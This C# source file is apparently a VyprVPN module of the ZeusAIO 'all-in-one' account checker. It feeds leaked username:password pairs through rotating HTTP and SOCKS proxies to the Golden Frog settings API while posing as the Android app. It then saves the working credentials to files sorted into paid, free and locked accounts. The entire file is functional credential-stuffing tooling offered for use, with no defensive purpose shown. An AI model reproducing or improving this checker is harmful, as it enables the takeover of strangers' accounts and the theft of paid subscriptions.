using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;

namespace VyperVpn
{
    class Check
    {
        public static string genIP()
        {
            Random random = new Random();
            return string.Concat(new string[]
            {
                random.Next(1, 255).ToString(),
                ".",
                random.Next(0, 255).ToString(),
                ".",
                random.Next(0, 255).ToString(),
                ".",
                random.Next(0, 255).ToString()
            });
        }
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.AllowAutoRedirect = false;
                        httpRequest.Cookies = new CookieDictionary(false);
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.UserAgent = "okhttp/2.3.0";
                        httpRequest.AddHeader("username", s[0]);
                        httpRequest.AddHeader("password", s[1]);
                        httpRequest.AddHeader("X-GF-Agent", "VyprVPN Android v2.19.0.7702. (56aa5dfd)");
                        httpRequest.AddHeader("X-GF-PRODUCT", "VyprVPN");
                        httpRequest.AddHeader("X-GF-PRODUCT-VERSION", "2.19.0.7702");
                        httpRequest.AddHeader("X-GF-PLATFORM", "Android");
                        httpRequest.AddHeader("X-GF-PLATFORM-VERSION", "6.0");
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                        new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        string text3 = httpRequest.Get("https://api.goldenfrog.com/settings", null).ToString();
                        bool flag7 = text3.Contains("confirmed\": true");
                            if (flag7)
                            {
                                string text4 = Check.Parse(text3, "\"account_level_display\": \"", "\"");
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - VYPERVPN] " + s[0] + ":" + s[1] + " | Plan: " + text4, Color.Green);
                                }
                                Export.AsResult("/Vypervpn_hits", s[0] + ":" + s[1] + " | Plan: " + text4);
                                return false;
                            }
                            else
                            {
                                bool flag9 = text3.Contains("invalid username or password");
                                if (flag9)
                                {
                                    //
                                    break;
                                }
                                else
                                {
                                    bool flag10 = text3.Contains("vpn\": null");
                                    if (flag10)
                                    {
                                        ZeusAIO.mainmenu.frees++;
                                        if (Config.config.LogorCui == "2")
                                        {
                                            Console.WriteLine("[FREE - VYPERVPN] " + s[0] + ":" + s[1], Color.OrangeRed);
                                        }
                                        Export.AsResult("/Vypervpn_frees", s[0] + ":" + s[1]);
                                        return false;
                                    }
                                    else
                                    {
                                        bool flag15 = text3.Contains("locked");
                                        if (!flag15)
                                        {
                                            ZeusAIO.mainmenu.frees++;
                                            if (Config.config.LogorCui == "2")
                                            {
                                                Console.WriteLine("[HIT {LOCKED} - VYPERVPN] " + s[0] + ":" + s[1], Color.Red);
                                            }
                                            Export.AsResult("/Vypervpn_locked", s[0] + ":" + s[1]);
                                            return false;
                                        }
                                        else if (text3.Contains("Your browser didn't send a complete request in time"))
                                        {
                                            break;
                                        }
                                        else
                                        {
                                            ZeusAIO.mainmenu.errors++;
                                            goto Retry;
                                        }
                                    }
                                }
                            }
                    }
                    //break;
                }
                catch (Exception ex)
                {
                        ZeusAIO.mainmenu.errors++;
                }
            return false;
        }
      

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}


